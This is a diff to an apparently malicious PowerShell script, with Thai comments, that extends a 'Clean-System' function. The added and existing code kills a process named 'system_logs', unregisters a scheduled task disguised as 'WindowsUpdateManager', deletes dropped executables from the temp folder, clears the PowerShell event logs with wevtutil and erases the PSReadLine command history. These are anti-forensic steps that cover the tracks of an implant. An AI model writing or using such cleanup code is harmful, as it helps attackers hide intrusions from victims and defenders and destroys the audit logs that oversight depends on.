@@ -87,6 +87,15 @@ function Install-And-Run-System {
 function Clean-System {
     Write-Host "`n[-] CLEANING SYSTEM..." -ForegroundColor Yellow
     
+    # 1. Kill process ก่อนลบไฟล์
+    try {
+        Write-Host "[CLEAN] Stopping processes..." -ForegroundColor Yellow
+        Get-Process -Name "system_logs" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 2
+        Write-Host "[+] Processes stopped" -ForegroundColor Green
+    } catch {}
+    
+    # 2. Remove scheduled task
     try {
         Unregister-ScheduledTask -TaskName "WindowsUpdateManager" -Confirm:$false -ErrorAction SilentlyContinue
         Write-Host "[+] Scheduled task removed" -ForegroundColor Green
@@ -94,17 +103,34 @@ function Clean-System {
         Write-Host "[!] Task removal failed: $($_.Exception.Message)" -ForegroundColor Red
     }
     
+    # 3. Clear event logs
     try {
         wevtutil.exe cl "Microsoft-Windows-PowerShell/Operational" 2>$null
         wevtutil.exe cl "Windows PowerShell" 2>$null
         Write-Host "[+] Event logs cleared" -ForegroundColor Green
     } catch {}
     
+    # 4. Clean temp files (แก้ไขใหม่)
     try {
-        Get-ChildItem "$env:TEMP\*" -Include "system_logs.exe" -ErrorAction SilentlyContinue | Remove-Item -Force
-        Write-Host "[+] Temp files cleaned" -ForegroundColor Green
+        Write-Host "[CLEAN] Cleaning temp files..." -ForegroundColor Yellow
+        $tempFiles = @(
+            "$env:TEMP\system_logs.exe",
+            "$env:TEMP\test.exe"
+        )
+        
+        foreach ($file in $tempFiles) {
+            if (Test-Path $file) {
+                try {
+                    Remove-Item $file -Force -ErrorAction Stop
+                    Write-Host "[+] Removed: $(Split-Path $file -Leaf)" -ForegroundColor Green
+                } catch {
+                    Write-Host "[!] Could not remove: $(Split-Path $file -Leaf)" -ForegroundColor Yellow
+                }
+            }
+        }
     } catch {}
     
+    # 5. Clear command history
     try {
         Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
         Write-Host "[+] Command history cleared" -ForegroundColor Green
